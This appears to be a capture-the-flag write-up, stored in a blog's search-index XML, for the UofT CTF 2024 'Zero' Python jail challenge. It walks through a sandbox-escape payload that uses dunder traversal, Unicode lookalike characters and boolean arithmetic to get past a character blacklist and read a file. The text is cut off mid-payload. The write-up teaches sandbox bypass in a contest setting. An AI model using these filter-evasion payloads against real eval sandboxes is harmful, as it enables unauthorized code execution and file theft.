<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>UofT CTF 2024 - [Zero] - Jail</title>
    <link href="/2024/01/14/uoftctf24/"/>
    <url>/2024/01/14/uoftctf24/</url>
    
    <content type="html"><![CDATA[<h1 id="Zero"><a href="#Zero" class="headerlink" title="Zero"></a>Zero</h1><div class="note note-warning">            <p><strong>Difficulty:</strong> <strong>Medium</strong><br><strong>Category:</strong> <strong>Jail</strong><br><strong>Flag:</strong> <strong><code>uoftctf{zero_security_too_apparently_lmao}</code></strong></p>          </div><p>In this challenge, we are given the following PyJail:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-comment"># no letters</span><br>    alphabet = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>    <span class="hljs-comment"># no numbers</span><br>    numbers = <span class="hljs-string">&quot;0123456789&quot;</span><br>    <span class="hljs-comment"># no underscores</span><br>    underscore = <span class="hljs-string">&quot;__&quot;</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>((c <span class="hljs-keyword">in</span> alphabet) <span class="hljs-keyword">or</span> (c <span class="hljs-keyword">in</span> numbers) <span class="hljs-keyword">or</span> (underscore <span class="hljs-keyword">in</span> code) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> code)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_eval</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-keyword">if</span> (check(code)):<br>        g = &#123;<span class="hljs-string">&#x27;__builtins__&#x27;</span>: <span class="hljs-literal">None</span>&#125;<br>        l = &#123;<span class="hljs-string">&#x27;__builtins__&#x27;</span>: <span class="hljs-literal">None</span>&#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(code, g, l )) <span class="hljs-comment"># good luck!</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;lol no&quot;</span>)<br>        <br>code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>safe_eval(code)<br></code></pre></td></tr></table></figure><p>This code sanitizes our input by removing all builtins and enforcing a blacklist on alphanumeric characters and double underscores “__”. This severely limits our ability to execute code, but as a wise man once said…</p><p><img src="/../images/uoftctf24/nothing-is-impossible-shia-labeouf.gif" alt="gif"></p><p>As soon as I saw this challenge, I immediately remembered two very similar challenges I solved from BYUCTF 2023: <a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/builtins-2">one which removed builtins</a> and <a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/a-z0-9">another which blacklisted alphanumeric characters</a>. As this challenge is essentially a combination of the two, my solution incorporates similar techniques.</p><p>Our ultimate goal is to read the <code>flag</code> file whose name&#x2F;path is visible in the Dockerfile. In the absence of any restrictions, we could do this with something like </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>).read()) <span class="hljs-comment"># (1)</span><br></code></pre></td></tr></table></figure><p>However, here we have several restrictions which prevent this simple code injection. The first one we need to bypass is the removal of builtins, which are native Python functions (such as <code>print()</code>) that are typically available by default. To recover these, we can exploit <a href="https://www.tutorialsteacher.com/python/magic-methods-in-python">the dunder method hierarchy</a> on Python objects like lists <code>[]</code>, tuples <code>()</code>, etc. In essence, we can traverse “up” and “down” the dunder method hierarchy to access all builtin methods which were removed in the sanitization. The following will do the same as (1) above, bypassing the builtins removal:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">121</span>].get_data(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-comment"># (2)</span><br></code></pre></td></tr></table></figure><p>(For more information on how this works, see <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins">here</a>. Note that the index <code>121</code> may vary by machine, so some tweaking&#x2F;bruting may be required.)</p><p>We can improve on (2) above to bypass the <strong>__</strong> blacklist by using Unicode character U+FF3F (<code>＿</code>) (<a href="https://www.compart.com/en/unicode/U+FF3F">found here</a>). Amazingly, Python interprets this character as an underscore in code execution, yet it passes the blacklist check!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿class_＿._＿bases_＿[<span class="hljs-number">0</span>]._＿subclasses_＿()[<span class="hljs-number">121</span>].get_data(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-comment"># (3)</span><br></code></pre></td></tr></table></figure><p>Now we need to bypass the alphanumeric character restriction, and this is where the challenge <em>really</em> begins. Buckle up, it’s about to get messy…</p><p><img src="/../images/uoftctf24/the_office.gif" alt="gif"></p><p>First let us start with replacing all alphabet characters <code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</code>. Just like with the underscores, we can utilize Unicode alphabet characters for parts of our exploit. The Python interpreter will perceive these as normal alphabet chars, but since they are not standard ASCII, they will bypass the blacklist check. I used some Unicode gothic alphabet characters (found <a href="https://en.wikipedia.org/wiki/Mathematical_Alphanumeric_Symbols">here</a>) as suitable substitutes for most of the exploit above:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[<span class="hljs-number">0</span>]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[<span class="hljs-number">121</span>].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) <span class="hljs-comment"># (4)</span><br></code></pre></td></tr></table></figure><p>Notice that we cannot use these gothic characters for the <code>flag</code> file, since <code>flag</code> is spelled with standard ASCII alphabet characters, and using <code>𝖋𝖑𝖆𝖌</code> will attempt to open a file which doesn’t exist. We need Python code which will form the string <code>flag</code> during execution without explicitly using those characters. To get around this, we can use the <code>__doc__</code> dunder attribute to obtain documentation about various objects and index that string to get the character we want. We can then concatenate the characters together to get the word <code>flag</code>! For example, to obtain the character <strong>g</strong>, we can use the following:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿𝖉𝖔𝖈_＿[<span class="hljs-number">38</span>]<br></code></pre></td></tr></table></figure><p>This will access the tuple documentation and get the 38th character (g):</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Built-<span class="hljs-keyword">in</span> immutable <span class="hljs-keyword">sequence</span>.\n\nIf no ar(g)ument <span class="hljs-keyword">is</span> given, the <span class="hljs-keyword">constructor</span> <span class="hljs-title function_">returns</span> <span class="hljs-title function_">an</span> <span class="hljs-title function_">empty</span> <span class="hljs-title function_">tuple</span>.\<span class="hljs-title function_">nIf</span> <span class="hljs-title function_">iterable</span> <span class="hljs-title function_">is</span> <span class="hljs-title function_">specified</span> <span class="hljs-title function_">the</span> <span class="hljs-title function_">tuple</span> <span class="hljs-title function_">is</span> <span class="hljs-title function_">initialized</span> <span class="hljs-title function_">from</span> <span class="hljs-title function_">iterable</span>&#x27;<span class="hljs-title function_">s</span> <span class="hljs-title function_">items</span>.\<span class="hljs-title function_">n</span>\<span class="hljs-title function_">nIf</span> <span class="hljs-title function_">the</span> <span class="hljs-title function_">argument</span> <span class="hljs-title function_">is</span> <span class="hljs-title function_">a</span> <span class="hljs-title function_">tuple</span>, <span class="hljs-title function_">the</span> <span class="hljs-title function_">return</span> <span class="hljs-title function_">value</span> <span class="hljs-title function_">is</span> <span class="hljs-title function_">the</span> <span class="hljs-title function_">same</span> <span class="hljs-title function_">object</span>.<br></code></pre></td></tr></table></figure><p>We can update (4) above using this method for all 4 characters of <code>flag</code> to get:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[<span class="hljs-number">0</span>]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[<span class="hljs-number">121</span>].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(<span class="hljs-string">&#x27;.&#x27;</span>,()._＿𝖉𝖔𝖈_＿[<span class="hljs-number">31</span>]+(<span class="hljs-string">&#x27;&#x27;</span>!=<span class="hljs-string">&#x27;&#x27;</span>)._＿𝖉𝖔𝖈_＿[<span class="hljs-number">3</span>]+()._＿𝖉𝖔𝖈_＿[<span class="hljs-number">14</span>]+()._＿𝖉𝖔𝖈_＿[<span class="hljs-number">38</span>]) <span class="hljs-comment"># (5)</span><br></code></pre></td></tr></table></figure><p>This will read the <code>flag</code> file, while bypassing all alphabet, double underscore, and builtins restrictions! Don’t believe me? Let’s do a sanity check:</p><p><img src="/../images/uoftctf24/sanity.png" alt="img1"></p><p>The last restriction we need to bypass is the one on digits <code>0123456789</code>. This is where my payload becomes monstrously long, and I apologize in advance for any mental anguish or distress I cause readers of this writeup. Turn back now if you have a serious heart condition or experience nauseua when subjected to unapologetically obnoxious one-liners of code.</p><p>The basic idea to replace digits (which two of my teammates, ahh and Matthias, helped me realize) is that in Python, <code>True</code>&#x2F;<code>False</code> are interpreted as <code>1</code>&#x2F;<code>0</code> when used in mathematical expressions. Thus, we can replace all numeric values in (5) with <code>True+True+True+...</code> for all integers &gt; 0 and <code>False</code> in the case of 0. To avoid using the strings <code>True</code> and <code>False</code> <em>directly</em>, we can substitute expressions which <em>evaluate</em> to <code>True</code>&#x2F;<code>False</code>, such as <code>(&#39;&#39;==&#39;&#39;)</code> (True) and <code>(&#39;&#39;!=&#39;&#39;)</code> (False). Thus, to form any integer, we can just add arbitrary amounts of <code>(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+...</code> together. While simple in concept, this substitution lengthens the payload <strong>considerably :)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;𝖈&#x27;</span>]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(<span class="hljs-string">&#x27;.&#x27;</span>,()._＿𝖉𝖔𝖈_＿[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)]+(<span class="hljs-string">&#x27;&#x27;</span>!=<span class="hljs-string">&#x27;&#x27;</span>)._＿𝖉𝖔𝖈_＿[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)]+()._＿𝖉𝖔𝖈_＿[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)]+()._＿𝖉𝖔𝖈_＿[(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-string">&#x27;&#x27;</span>)+(<span 